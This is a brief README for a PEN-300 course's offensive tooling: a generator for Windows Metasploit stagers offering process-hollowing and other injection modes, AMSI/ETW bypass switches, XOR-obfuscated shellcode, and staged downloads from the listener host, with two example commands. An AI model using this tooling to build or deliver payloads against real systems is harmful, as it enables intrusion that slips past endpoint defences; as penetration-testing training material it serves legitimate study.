# Tools for my PEN-300 course

* Update `LHOST` and `LPORT` in `ak.py` to your MSF (or other C2) listening IP and port before crafting any tools.
* By default, staged payloads will pull from the following URL `http://(LHOST)/sc`.
* Stageless payloads will automatically apply an XOR encryption to obfuscate the shellcode.

## MSF Stager

```
usage: generate_win_msf_stager.py [-h]
                                  [--injection {hollow,interprocess,earlybird,standard}]
                                  [--format {exe,dll}]
                                  [--heuristics | --no-heuristics]
                                  [--amsi | --no-amsi] [--etw | --no-etw]
                                  [--stageless | --no-stageless]

optional arguments:
  -h, --help            show this help message and exit
  --injection {hollow,interprocess,earlybird,standard}, -i {hollow,interprocess,earlybird,standard}
  --format {exe,dll}, -f {exe,dll}
  --heuristics, --no-heuristics
  --amsi, --no-amsi
  --etw, --no-etw
  --stageless, --no-stageless
```

## Examples

```sh
# Create a dll that will use hollowing to load shellcode
python3 generate_win_msf_stager.py --injection hollow --format dll

# Create a stageless exe that will load and run shellcode within the same process
python3 generate_win_msf_stager.py --stageless --format exe
```
